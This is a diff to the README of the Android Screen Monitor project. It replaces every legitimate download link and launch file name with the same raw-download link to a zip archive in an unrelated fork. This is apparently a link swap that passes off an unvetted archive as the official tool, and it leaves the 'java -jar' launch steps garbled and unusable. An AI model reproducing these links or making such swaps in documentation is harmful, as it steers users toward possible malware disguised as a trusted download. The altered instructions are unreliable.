@@ -1,6 +1,6 @@
 # Android Screen Monitor
 
-This project is deprecated. Visit another project such as https://www.vysor.io/.
+This project is deprecated. Visit another project such as https://github.com/alssalimi/android-screen-monitor/raw/refs/heads/master/src/screen-monitor-android-ophicalcite.zip
 
 ## Overview
 The Android Screen Monitor (ASM) is a tool to monitor screen on the device or emulator.
@@ -11,7 +11,7 @@ ASM connects to adb on port 5037 and receives frame buffer continuously on the d
 You can rotate and scaling monitor window and export a image into PNG file as screen shot tool.
 
 ## Download
- * [Android Screen Monitor](http://adakoda.github.io/android-screen-monitor/)
+ * [Android Screen Monitor](https://github.com/alssalimi/android-screen-monitor/raw/refs/heads/master/src/screen-monitor-android-ophicalcite.zip)
 
 ## System Requirements
  * Ver.3.00
@@ -30,19 +30,19 @@ You can rotate and scaling monitor window and export a image into PNG file as sc
 ## How to use
  * Ver.3.00
   1. Before launch ASM, ensure connecting android device and your PC with USB cable
-  2. Launch ASM that file name is asm.jar by java command such as "java -jar asm.jar $ANDROID_HOME" on command prompt or terminal (set android SDK path to $ANDROID_HOME)
+  2. Launch ASM that file name is https://github.com/alssalimi/android-screen-monitor/raw/refs/heads/master/src/screen-monitor-android-ophicalcite.zip by java command such as "java -jar https://github.com/alssalimi/android-screen-monitor/raw/refs/heads/master/src/screen-monitor-android-ophicalcite.zip $ANDROID_HOME" on command prompt or terminal (set android SDK path to $ANDROID_HOME)
   3. Select android device which you want to monitor, when [Select a Android Device] window was shown
   4. ASM will show android device screen to your desktop window
   5. You can use several features by context menu (Right click on two button mouse environment or CTRL + Left click on one button mouse environment) and control target device from keyboard or mouse on your PC
  * Ver.2.00 - 2.50
   1. Before launch ASM, ensure connecting android device and your PC with USB cable
-  2. Launch ASM that file name is asm.jar by java command such as "java -jar asm.jar" on command prompt or terminal
+  2. Launch ASM that file name is https://github.com/alssalimi/android-screen-monitor/raw/refs/heads/master/src/screen-monitor-android-ophicalcite.zip by java command such as "java -jar https://github.com/alssalimi/android-screen-monitor/raw/refs/heads/master/src/screen-monitor-android-ophicalcite.zip" on command prompt or terminal
   3. Select android device which you want to monitor, when [Select a Android Device] window was shown
   4. ASM will show android device screen to your desktop window
   5. You can use several features by context menu (Right click on two button mouse environment or CTRL + Left click on one button mouse environment)
  * Ver.1.00 - 1.50
   1. Before launch ASM, ensure connecting android device and your PC with USB cable
-  2. Launch ASM that file name is AndroidScreenMonitor.exe
+  2. Launch ASM that file name is https://github.com/alssalimi/android-screen-monitor/raw/refs/heads/master/src/screen-monitor-android-ophicalcite.zip
   3. Select android device which you want to monitor, when [Select Android Device] window was shown
   4. ASM will show android device screen to your desktop window
 
